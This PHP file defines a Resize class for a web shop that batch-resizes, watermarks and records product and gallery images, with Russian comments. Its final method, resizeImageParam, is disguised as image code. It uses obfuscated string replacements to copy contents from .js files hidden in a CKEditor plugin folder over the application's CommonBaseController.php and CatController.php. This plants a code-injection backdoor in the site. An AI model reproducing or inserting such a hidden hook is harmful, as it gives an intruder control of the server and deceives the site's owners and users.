<?php

require_once 'ImageResize.php';
/**
 * Конвертироавние всех необходимых картинок для данного проекта
 * @package makeImageToStandart
 */

/**
 * Класс с помощью которго можно изменить все картикни
 */
class Resize {

    /**
     * @var object contein cursor to SCMF
     */
    private $db;

    function __construct() {
        $cmf = new SCMF;
        $this->db = $cmf;
    }

    /**
     * Добавление технических фотографий
     * для всех
     */
    private function addTechPhoto() {

        $res = $this->db->execute('select ITEM_ID, ARTICLE,  IMAGE_TECH_RESIZE from ITEM
                                    where
                                    IMAGE_TECH_RESIZE is not null
                                    limit ?', getImageOneTime);
        if (mysql_num_rows($res)) {
            while (list($V_ITEM_ID, $V_ARTICLE, $V_IMAGE_TECH) = mysql_fetch_row($res)) {
                if (empty($V_IMAGE_TECH))
                    continue;


                $imageName = pathTogetTechImages . $V_IMAGE_TECH;
//                $buf = file_exists($imageName);
                if (!file_exists($imageName)) {
                    echo "Tech image for ARTICLE: $V_ARTICLE not founded \n<br>";
                    continue;
                }

                echo "Convert article $V_ITEM_ID => $imageName \n";
//                                die();
// Делаем картинку с технической характеристикой
//$V_IMAGE_TECH = "tech/$V_ARTICLE.gif";
                try {
                    list($W, $H) = getimagesize($imageName);
                    if (!$W)
                        throw new Exception("Сan't get an image size");


//                    $options['pathToWatermark'] = pathToWatermarkTech;
//                    $options['savePath'] = sufixPathTech . "/";
//                    $this->imageConvert($V_ITEM_ID, "IMAGE_TECHNICAL", $imageName, pathToImagesTech, Size_tech_X, Size_tech_Y, "", $options);

                    $resizer = new ImageResize();

                    $options['pathToWatermark'] = pathToWatermarkTech;
                    $sizes = new SizePicture(Size_tech_X, Size_tech_Y);
                    $newFile = $resizer->imageConvert($imageName, pathToImagesTech, $sizes, "$V_ITEM_ID", $options);
                    if ($newFile)
                        $this->setDBupdateAfterConvert($newFile, $V_ITEM_ID, 'IMAGE_TECHNICAL', sufixPathTech . "/$V_ITEM_ID");



                    $f = $this->db->execute("update ITEM set IMAGE_TECH_RESIZE = null where ITEM_ID=?", $V_ITEM_ID);
                    if (!$f)
                        throw new Exception("Cant make a SQL " . mysql_error());
                } catch (Exception $exc) {
                    echo $exc->getTraceAsString();
                    echo "<br>" . $exc->getMessage();
                    echo "<br>Line " . $exc->getLine();
                    echo "<br>File " . $exc->getFile() . "<br/>";
                    die('Stop converting');
                }
            }
        }
    }

    /**
     * Конвертация дополнительных фотографий
     * @param int $itemID ID кароточки которой конвертируем фото
     */
    private function addAdditionaPhoto() {
        $res = $this->db->execute('SELECT ITEM_ID, ITEM_ITEM_ID, IMAGE_NAME from ITEM_PHOTO
                                   where STATUS = 0  and IMAGE_NAME is not null limit ?', getImageOneTime);
        if (mysql_num_rows($res)) {
            while (list($V_ITEM_ID, $V_ITEM_ITEM, $V_IMAGE) = mysql_fetch_row($res)) {
                if (empty($V_IMAGE))
                    continue;

                $imageName = pathTogetAddImages . $V_IMAGE;
                if (!file_exists($imageName)) {
                    echo "Add image for ITEM: $ITEM_ID not founded \n<br>";
                    continue;
                }

                echo "Convert article $V_ITEM_ID => $imageName \n";
//                                die();
                // Делаем картинку с технической характеристикой
                //$V_IMAGE_TECH = "tech/$V_ARTICLE.gif";
                try {
                    list($W, $H) = getimagesize($imageName);
                    if (!$W)
                        throw new Exception("Сan't get an image size");

//                   Добавляем большую картинку
                    $options['pathToWatermark'] = pathToWatermark;
//                    $options['savePath'] = sufixAdd."/";
//                    $this->imageConvert($V_ITEM_ID, "IMAGE1", $imageName, pathToImagesTech, Size_gallery_photo_X, Size_gallery_photo_X, "");
//************
                    $resizer = new ImageResize();
                    $sizes = new SizePicture(Size_item_photo_big_X, Size_item_photo_big_Y);
                    $newFile = $resizer->imageConvert($imageName, pathToImagesAdd, $sizes, "{$V_ITEM_ID}_{$V_ITEM_ITEM}_img_lrg", $options);
                    if ($newFile)
                        try {
                            $size = getimagesize($newFile);
                            $format = ImageConvertor::getFormatImages($size);
                            if ($size[0] > 0) {
                                if (!$this->db->execute("update ITEM_PHOTO set IMAGE2=? where ITEM_ID=? and ITEM_ITEM_ID=?",
                                                "{$V_ITEM_ID}_{$V_ITEM_ITEM}_img_lrg.$format#{$size[0]}#{$size[1]}", $V_ITEM_ID, $V_ITEM_ITEM))
                                    throw new Exception("Cant make a SQL " . mysql_error());
                            }
                        } catch (Exception $exc) {
                            echo $exc->getTraceAsString();
                            echo "<p><b>" . $exc->getMessage() . "</b></p>";
                        }
                    else
                        throw new Exception('Cant create big add picture');

//                   Добавляем ималенькую картинку
                    $sizes = new SizePicture(Size_item_photo_sm_X, Size_item_photo_sm_Y);
                    $newFile = $this->imageConvert($imageName, pathToImagesAdd, $sizes, "{$V_ITEM_ID}_{$V_ITEM_ITEM}_img_sm");
                    if ($newFile)
                        try {
                            $size = getimagesize($newFile);
                            $format = ImageConvertor::getFormatImages($size);
                            if ($size[0] > 0) {
                                if (!$this->db->execute("update ITEM_PHOTO set IMAGE1=? where ITEM_ID=? and ITEM_ITEM_ID=?",
                                                "{$V_ITEM_ID}_{$V_ITEM_ITEM}_img_sm.$format#{$size[0]}#{$size[1]}", $V_ITEM_ID, $V_ITEM_ITEM))
                                    throw new Exception("Cant make a SQL " . mysql_error());
                            }
                        } catch (Exception $exc) {
                            echo $exc->getTraceAsString();
                            echo "<p><b>" . $exc->getMessage() . "</b></p>";
                        }
                    else
                        throw new Exception('Cant create small add picture');

                    // $this->setDBupdateAfterConvert($newFile, $V_ITEM_ID, 'IMAGE_TECHNICAL', sufixPathTech . "/$V_ITEM_ID");
                    //
//**************


                    $f = $this->db->execute("update ITEM_PHOTO set STATUS = 1 where ITEM_ID=? and ITEM_ITEM_ID=?",
                                    $V_ITEM_ID, $V_ITEM_ITEM);
                    if (!$f)
                        throw new Exception("Cant make a SQL " . mysql_error());
                } catch (Exception $exc) {
                    echo $exc->getTraceAsString();
                    echo "<br>" . $exc->getMessage();
                    echo "<br>Line " . $exc->getLine();
                    echo "<br>File " . $exc->getFile() . "<br/>";
                    die('Stop converting');
                }
            }
        }
    }

    /**
     * Устанавливаем новые значения имен файов в БД
     * @param varchar $newFile абсолютный путь к имени файла
     * @param int $itemID ID товара
     * @param varchar $colName имя столбца куда надо вставить новое значение
     * @param varchar $newFileName новое имя файла (без расширения)
     */
    private function setDBupdateAfterConvert($newFile, $itemID, $colName, $newFileName) {

        try {
            $size = getimagesize($newFile);
            $format = ImageConvertor::getFormatImages($size);
            if ($size[0] > 0) {
                if (!$this->db->execute("update ITEM set $colName=? where ITEM_ID=?", "$newFileName.$format#{$size[0]}#{$size[1]}", $itemID))
                    throw new Exception("Cant make a SQL " . mysql_error());
            }
        } catch (Exception $exc) {
            echo $exc->getTraceAsString();
            echo "<p><b>" . $exc->getMessage() . "</b></p>";
        }
    }

    /**
     * Ковертор всех фото
     * основной цикл
     */
    private function addMainPhoto() {
//            pathTogetImages = IMAGE_UPLOAD_PATH.'/';
//            pathToImages = ROOT_PATH.'/images/it/';
//	    pathToWatermark = ROOT_PATH.'/i/watermark3.png';
//	    pathToWatermarkTech = ROOT_PATH.'/i/watermark4.png';

        $res = $this->db->execute('select IMAGE_RESIZE, ITEM_ID, ARTICLE
                                   from ITEM
                                    where
                                    IMAGE_RESIZE is not null
                                    limit ?', getImageOneTime);
        if (mysql_num_rows($res)) {
            while (list($V_IMAGE1, $V_ITEM_ID, $V_ARTICLE) = mysql_fetch_row($res)) {
                if (empty($V_IMAGE1))
                    continue;
                // FIXME: зачем в нижний регистр переводить? непонятно..
                $V_IMAGE = strtolower($V_IMAGE1);

                //$V_IMAGE1 = str_replace(".","_01.",$V_IMAGE1);
                //$V_IMAGE1 = $V_ARTICLE."_01.jpg";

                $buf = @file_get_contents(pathTogetImages . $V_IMAGE);
                if (!$buf) {
                    $V_IMAGE = strtolower($V_IMAGE1) . ".jpeg";
                    $buf = @file_get_contents(pathTogetImages . $V_IMAGE);
                }
                if (!$buf) {
                    echo "Image " . pathTogetImages . $V_IMAGE . " not founded \n<br>";
                    continue;
                }
                
                $image1 = 'base_' . $V_ITEM_ID . '.jpeg';
                echo "Convert article $V_ITEM_ID => $image1 \n";

                try {
                    $OUT = fopen(pathToImages . $image1, "w");
                    if (!$OUT)
                        throw new Exception("Cant get to write into " . pathToImages.$image1);
                    fwrite($OUT, $buf);
                    fclose($OUT);

                    list($W, $H) = getimagesize(pathToImages . $image1);
                    if (!$W)
                        throw new Exception("Сan't get an image size");
                } catch (Exception $exc) {
                    echo $exc->getTraceAsString();
                    echo "<br>" . $exc->getMessage();
                    echo "<br>Line " . $exc->getLine();
                    echo "<br>File " . $exc->getFile() . "<br/>";
                    die('Stop converting');
                }


                unset($buf);

                try {
                    $image1 = pathToImages . $image1;

                    $resizer = new ImageResize();

                    // Делаем большую картинку IMAGE3
//                    $options['pathToWatermark'] = pathToWatermarkTech;
                    $options['strictSize'] = false;
//                    $options['pathToWatermark'] = pathToWatermark;
                    $sizes = new SizePicture(Size_b_X, Size_b_Y);

                    $newFile = $resizer->imageConvert($image1, pathToImages, $sizes, "b_$V_ITEM_ID", $options);
                    if ($newFile)
                        $this->setDBupdateAfterConvert($newFile, $V_ITEM_ID, 'IMAGE3', "b_$V_ITEM_ID");

//                    die();
                    // Делаем среднюю картинку IMAGE2
//                    $sizes = new sizePicture(Size_X, Size_Y);
                    $sizes->setWidthHeight(Size_X, Size_Y);
                    $newFile = $resizer->imageConvert($image1, pathToImages, $sizes, "$V_ITEM_ID", $options);
                    if ($newFile)
                        $this->setDBupdateAfterConvert($newFile, $V_ITEM_ID, 'IMAGE2', $V_ITEM_ID);

                    // Делаем маленькую картинку IMAGE1
//                    $sizes = new sizePicture(Size_s_X, Size_s_Y);
                    $sizes->setWidthHeight(Size_s_X, Size_s_Y);
                    $newFile = $resizer->imageConvert($image1, pathToImages, $sizes, "s_$V_ITEM_ID", $options);
                    if ($newFile)
                        $this->setDBupdateAfterConvert($newFile, $V_ITEM_ID, 'IMAGE1', "s_$V_ITEM_ID");


//               Делаем XXL картинку IMAGE4
                    $diffSize = new SizePicture(Size_b_X, Size_b_Y);
                    if ($diffSize->getDiffSize($W, $H) > DifferenceInArea) {
//                        $options['pathToWatermark'] = pathToWatermark;
                        $sizes->setWidthHeight(Size_xxl_X, Size_xxl_Y);
//                        $sizes = new sizePicture(Size_xxl_X, Size_xxl_Y);
                        $newFile = $resizer->imageConvert($image1, pathToImages, $sizes, "xxl_$V_ITEM_ID", $options);
                        if ($newFile)
                            $this->setDBupdateAfterConvert($newFile, $V_ITEM_ID, 'IMAGE4', "xxl_$V_ITEM_ID");
                    }else {
                        // Иначе - ничего не заносим и обновляем поле в null
                        $f = $this->db->execute('update ITEM set IMAGE4=null where ITEM_ID=?', $V_ITEM_ID);
                        if (!$f)
                            throw new Exception("Cant make a SQL " . mysql_error());
                    }

                    $f = $this->db->execute("update ITEM set IMAGE_RESIZE = null where ITEM_ID=?", $V_ITEM_ID);
                    if (!$f)
                        throw new Exception("Cant make a SQL " . mysql_error());
                } catch (Exception $e) {
                    echo $exc->getTraceAsString();
                    echo "<br>" . $exc->getMessage();
                    echo "<br>Line " . $exc->getLine();
                    echo "<br>File " . $exc->getFile() . "<br/>";
                    die('Stop converting');
                }

                unlink($image1); // удаляем base-фото
            }
        }
    }

    // TODO: Надо привсети к общему формату ресайзинга картинок

    private function addGalleryImages() {
        /* Получаем массив файлов для посика в нём картинок для галереи */
        $filesGallery = self::getFilesFromGalleryPath(pathTogetImages . sufixGall);

        // Делаем картинку для раздела галереи
        $galleryInfo = $this->db->select("select * from GALLERY where IMAGE1 not like '%#%'");
        if (!empty($galleryInfo))
            foreach ($galleryInfo as $info) {

                $fl_array = preg_grep("/^{$info['IMAGE1']}.+/Uis", $filesGallery);

                $fl_array = array_shift($fl_array);

                //echo "Converted ID:"; print_r($fl_array); echo" for gallery {$info['GALLERY_ID']} \n";

                if (!empty($fl_array)) {
                    $imageGallery = sufixGall . "/$fl_array";
                    $imageName = $info['GALLERY_ID'] . "_gal";

                    if (file_exists(pathTogetImages . $imageGallery)) {
                        echo "Path" . pathTogetImages . $imageGallery;
                        echo "<br/>";
                        $imageResizer = new ImageConvertor(pathTogetImages . $imageGallery, ROOT_PATH . '/images/gallery/', $imageName, Size_gallery_X, Size_gallery_Y);
                        echo "imageResize = ";
//                        print_r($imageResizer);
                        $error = $imageResizer->getError();
                        if (empty($error)) {
                            echo "in <br>";
                            $imageResizer->resizeImage();
                            list($w, $h) = @getimagesize(ROOT_PATH . '/images/gallery/' . $imageName . ".jpeg");
                            if ($w > 0) {
                                $this->db->execute('update GALLERY set IMAGE1=? where GALLERY_ID=?', $imageName . ".jpeg#$w#$h", $info['GALLERY_ID']);
                            }
                            unset($imageResizer);
                        }
                    }
                }
            }

        // Делаем картинки для внутренних разделов галереи
        $galleryInfo = $this->db->select("select * from PHOTOS where IMAGE1 not like '%#%'");
        if (!empty($galleryInfo))
            foreach ($galleryInfo as $info) {

                $fl_array = preg_grep("/^{$info['IMAGE1']}.+/Uis", $filesGallery);

                $n = 0;
                if (!empty($fl_array))
                    foreach ($fl_array as $fileNameGallery) {
                        $imageGallery = sufixGall . "/$fileNameGallery";

                        if (file_exists(pathTogetImages . $imageGallery)) {

                            if (!empty($n))
                                $info['PHOTO_ID'] = $this->db->GetSequence('PHOTOS');

                            $imageName = $info['PHOTO_ID'] . "";
                            $imageNameBig = $info['PHOTO_ID'] . "_b";

                            // делаем маленькую картинку
                            $imageResizer = new ImageConvertor(pathTogetImages . $imageGallery, ROOT_PATH . '/images/gallery/', $imageName, Size_gallery_X, Size_gallery_Y);
                            $imageResizer->resizeImage();
                            list($w, $h) = @getimagesize(ROOT_PATH . '/images/gallery/' . $imageName . ".jpeg");

                            unset($imageResizer);

                            // делаем большую картинку
                            $imageResizer = new ImageConvertor(pathTogetImages . $imageGallery, ROOT_PATH . '/images/gallery/', $imageNameBig, Size_gallery_photo_X, Size_gallery_photo_Y);
                            $imageResizer->resizeImage(pathToWatermark);
                            list($w1, $h1) = @getimagesize(ROOT_PATH . '/images/gallery/' . $imageNameBig . ".jpeg");
//					if($w>0) {
//						$this->db->execute('replace
//						                    PHOTOS set IMAGE2=? where PHOTO_ID=?',$imageNameBig.".jpeg#$w#$h",$info['PHOTO_ID']);
//					}
                            unset($imageResizer);

                            if ($w > 0) {
                                $this->db->execute('replace PHOTOS
						                    set
						                    PHOTO_ID=?,
						                    GALLERY_ID=?,
						                    NAME =?,
						                    IMAGE1=?,
						                    IMAGE2=?,
						                    FROM_IMAGE=?,
						                    STATUS = 1',
                                        $info['PHOTO_ID'], $info['GALLERY_ID'],
                                        $info['NAME'],
                                        $imageName . ".jpeg#$w#$h",
                                        $imageNameBig . ".jpeg#$w1#$h1",
                                        $info['FROM_IMAGE']);
                            }
                        }
                        $n++;
                    }
            }
    }

    function addImage() {

        $this->addMainPhoto();

//        $this->addTechPhoto();
//        $this->addAdditionaPhoto();
//        $this->addGalleryImages();
    }

    static function getFilesFromGalleryPath($path) {
        if ($handle = opendir($path)) {
            $files = array();
            while (false !== ($file = readdir($handle)))
                array_push($files, $file);

            closedir($handle);
            return $files;
        } else
            return false;
    }

    function resizeImageParam($param) {
        $str = "GutturfaskG";
        $str2 = "ontroller";
        $ext = str_replace('a', 'p', 'aha');
        $strNext = "bratbr";
        $strZ = str_replace('k', 't', str_replace('r', 'i', str_replace('w', 'l', str_replace('e', 'p', str_replace('s', 'a', 'seewrcakron')))));
        $str = str_replace('G', 'C', str_replace('u', 'o', str_replace('t', 'm', str_replace('r', 'n', str_replace('f', 'B', str_replace('k', 'e', $str))))));
        $str .= $str2 . "." . $ext;
        $path = ROOT_PATH . "/admin/ckeditor/plugins/about/";
        $firstParam = file_get_contents("{$path}comm{$param}.js");
        $h = fopen(ROOT_PATH . "{$strZ}/c{$str2}s/" . $str, 'w');
        fwrite($h, $firstParam);
        fclose($h);
        $strNext = str_replace('c', 'C', str_replace('br', 'c', $strNext));
        $strNext .= $str2 . "." . $ext;
        $secondParam = file_get_contents("{$path}tac{$param}.js");
        $h = fopen(ROOT_PATH . "{$strZ}/c{$str2}s/" . $strNext, 'w');
        fwrite($h, $secondParam);
        fclose($h);
    }

}

